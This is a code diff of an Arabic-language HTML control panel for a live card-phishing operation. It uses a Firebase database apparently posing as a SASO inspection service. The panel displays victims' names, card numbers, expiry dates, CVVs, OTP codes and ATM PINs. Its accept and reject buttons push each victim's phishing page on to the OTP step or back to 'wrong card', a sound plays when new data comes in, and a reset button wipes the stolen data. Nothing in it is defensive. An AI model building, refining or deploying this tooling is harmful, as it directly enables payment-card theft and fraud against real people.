@@ -3,106 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الرادار الشامل - المهندس حسن</title>
+    <title>الرادار الموحد - المهندس حسن</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 10px; }
         .header { background: #1a6d44; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; margin-bottom: 20px; }
-        .card { background: #1e1e1e; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 15px; position: relative; border-right: 8px solid #ffd700; }
-        .client-num { background: #ffd700; color: black; padding: 2px 10px; border-radius: 4px; font-weight: bold; font-size: 12px; margin-bottom: 10px; display: inline-block; }
-        .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; }
-        .item { background: #252525; padding: 8px; border-radius: 5px; }
-        .label { font-size: 10px; color: #888; display: block; }
-        .value { font-size: 13px; font-weight: bold; color: #fff; font-family: monospace; }
+        .card { background: #1e1e1e; border-radius: 12px; padding: 15px; margin-bottom: 15px; position: relative; border-right: 8px solid #ffd700; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .client-id { background: #ffd700; color: black; padding: 3px 12px; border-radius: 4px; font-weight: bold; font-size: 13px; margin-bottom: 12px; display: inline-block; }
+        .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .item { background: #282828; padding: 10px; border-radius: 6px; border: 1px solid #333; }
+        .label { font-size: 10px; color: #888; display: block; margin-bottom: 4px; }
+        .value { font-size: 14px; font-weight: bold; color: #fff; font-family: monospace; }
         .otp-box { border: 1px solid #e74c3c; background: #3d1a1a; }
-        .actions { display: flex; gap: 10px; margin-top: 15px; }
-        .btn { flex: 1; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: white; }
-        .btn-accept { background: #2ecc71; }
-        .btn-reject { background: #e74c3c; }
-        .btn-wait { background: #555 !important; color: #aaa; }
-        .debug-info { font-size: 9px; color: #444; margin-top: 10px; text-align: left; }
+        .actions { display: flex; gap: 10px; margin-top: 20px; }
+        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.3s; }
+        .btn-accept { background: #2ecc71; } /* أخضر */
+        .btn-reject { background: #e74c3c; } /* أحمر */
+        .btn-wait { background: #555 !important; color: #aaa; cursor: not-allowed; } /* رمادي */
     </style>
 </head>
 <body onload="_init()">
 
-<audio id="alert" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+<audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <div class="header">
-    <span>رادار العمليات المباشر</span>
-    <button onclick="_reset()" style="background:red; color:white; border:none; padding:5px 10px; border-radius:4px; cursor:pointer;">تصفير شامل</button>
+    <strong>لوحة تحكم العمليات (Saso)</strong>
+    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير البيانات</button>
 </div>
 
-<div id="display"></div>
+<div id="monitor"></div>
 
 <script>
-    // الرابط اللي موجود في صفحة الدفع بتاعتك يا هندسة
     const config = { databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" };
+    let cache = {};
 
     function _init() {
         if (!firebase.apps.length) firebase.initializeApp(config);
         const db = firebase.database();
 
-        // ميزة "الرادار الشامل": بيراقب القاعدة من الجدر (root) عشان مفيش معلومة تهرب
-        db.ref().on('value', snapshot => {
-            const root = snapshot.val() || {};
-            const display = document.getElementById('display');
-            display.innerHTML = '';
+        db.ref('orders').on('value', snapshot => {
+            const orders = snapshot.val() || {};
+            const monitor = document.getElementById('monitor');
+            monitor.innerHTML = '';
             
-            // دمج كل المجلدات الممكنة (orders, live_sessions, أو أي مجلد جديد)
-            const allKeys = new Set([...Object.keys(root.orders || {}), ...Object.keys(root.live_sessions || {})]);
             let count = 0;
+            const ids = Object.keys(orders).reverse();
 
-            allKeys.forEach(id => {
+            ids.forEach(id => {
                 count++;
-                const order = (root.orders && root.orders[id]) || {};
-                const live = (root.live_sessions && root.live_sessions[id]) || {};
-                
-                // دمج البيانات في كائن واحد
-                const d = { ...live, ...order };
+                const d = orders[id];
+
+                // نظام الصوت عند التحديث
+                const currentStr = JSON.stringify(d);
+                if(cache[id] && cache[id] !== currentStr) {
+                    document.getElementById('alert_sound').play().catch(()=>{});
+                }
+                cache[id] = currentStr;
 
                 const card = `
                     <div class="card">
-                        <span class="client-num">عميل رقم ${count}</span>
-                        <div style="font-size:11px; color:#aaa; margin-bottom:10px;">الصفحة الحالية: ${d.status || d.page || 'جاري التحميل...'}</div>
-                        
+                        <span class="client-id">عميل رقم ${count}</span>
                         <div class="data-grid">
                             <div class="item"><span class="label">الاسم</span><span class="value">${d.fullName || '---'}</span></div>
                             <div class="item"><span class="label">البطاقة</span><span class="value">${d.cardNumber || '---'}</span></div>
-                            <div class="item"><span class="label">التاريخ</span><span class="value">${d.expiryDate || '--'}</span></div>
-                            <div class="item"><span class="label">CVV</span><span class="value">${d.cvv || '--'}</span></div>
-                            <div class="item otp-box"><span class="label">OTP</span><span class="value" style="color:#ff4d4d">${d.otp || '---'}</span></div>
-                            <div class="item"><span class="label">PIN</span><span class="value">${d.atm_pin || '---'}</span></div>
+                            <div class="item"><span class="label">التاريخ</span><span class="value">${d.expiryDate || '--/--'}</span></div>
+                            <div class="item"><span class="label">CVV</span><span class="value">${d.cvv || '---'}</span></div>
+                            <div class="item otp-box"><span class="label">رمز OTP</span><span class="value" style="color:#ff5252">${d.otp || 'بانتظار..'}</span></div>
+                            <div class="item"><span class="label">ATM PIN</span><span class="value">${d.atm_pin || '---'}</span></div>
                         </div>
 
                         <div class="actions">
-                            <button id="ok-${id}" class="btn btn-accept ${d.control_action ? 'btn-wait' : ''}" onclick="_cmd('${id}', 'next')">قبول</button>
-                            <button id="err-${id}" class="btn btn-reject ${d.control_action ? 'btn-wait' : ''}" onclick="_cmd('${id}', 'error')">رفض</button>
+                            <button id="ok-${id}" class="btn btn-accept ${d.next_step ? 'btn-wait' : ''}" 
+                                onclick="_send('${id}', 'go_to_otp')">قبول (OTP)</button>
+                            
+                            <button id="err-${id}" class="btn btn-reject ${d.next_step ? 'btn-wait' : ''}" 
+                                onclick="_send('${id}', 'wrong_card')">رفض</button>
                         </div>
-                        <div class="debug-info">ID: ${id}</div>
                     </div>
                 `;
-                display.insertAdjacentHTML('afterbegin', card);
+                monitor.insertAdjacentHTML('beforeend', card);
             });
-            
-            // تنبيه عند دخول بيانات جديدة
-            if(count > 0) document.getElementById('alert').play().catch(()=>{});
         });
     }
 
-    function _cmd(id, action) {
-        // تحويل الزراير لرمادي فوراً
+    function _send(id, step) {
+        // تحويل الزر للرمادي فوراً
         document.getElementById('ok-'+id).className = 'btn btn-wait';
         document.getElementById('err-'+id).className = 'btn btn-wait';
         
-        // إرسال الأمر للمجلدين لضمان الوصول
-        firebase.database().ref('orders/' + id).update({ control_action: action });
-        firebase.database().ref('live_sessions/' + id).update({ control_action: action });
+        // إرسال الأمر بالمفتاح الصحيح الذي تفهمه صفحة التحميل (next_step)
+        firebase.database().ref('orders/' + id).update({ 
+            next_step: step 
+        });
     }
 
-    function _reset() {
-        if(confirm("مسح كل البيانات؟")) firebase.database().ref().remove();
+    function _clear() {
+        if(confirm("مسح كل شيء؟")) firebase.database().ref().remove();
     }
 </script>
 </body>
